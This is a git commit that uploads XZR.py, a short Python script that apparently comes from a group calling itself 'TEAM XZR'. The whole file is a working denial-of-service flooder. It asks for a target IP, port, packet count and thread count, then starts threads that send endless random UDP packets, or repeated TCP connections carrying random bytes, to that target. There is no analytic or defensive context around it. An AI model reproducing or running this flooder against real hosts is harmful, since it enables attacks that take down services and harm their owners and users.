e07dcdf8a364c097f2a47ca469f2b673adb1805b
XOzora <89325873+XOzora@users.noreply.github.com>
2021-08-22 08:35:03 +0700

    Add files via upload

---
+++ XZR.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python3
+import random
+import socket
+import threading
+
+print("TEAM XZR")
+print(" JANGAN ABUSE TOD ")
+
+ip = str(input("  Ip:"))
+port = int(input(" Port:"))
+choice = str(input(" (y/n):"))
+times = int(input(" Paket :"))
+threads = int(input(" Threads:"))
+def run():
+	data = random._urandom(1000)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" TEAM XZR ATTACK ")
+		except:
+			print("[!] RUSAK")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" TEAM XZR ATTACK ")
+		except:
+			s.close()
+			print("[*] RUSAK")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
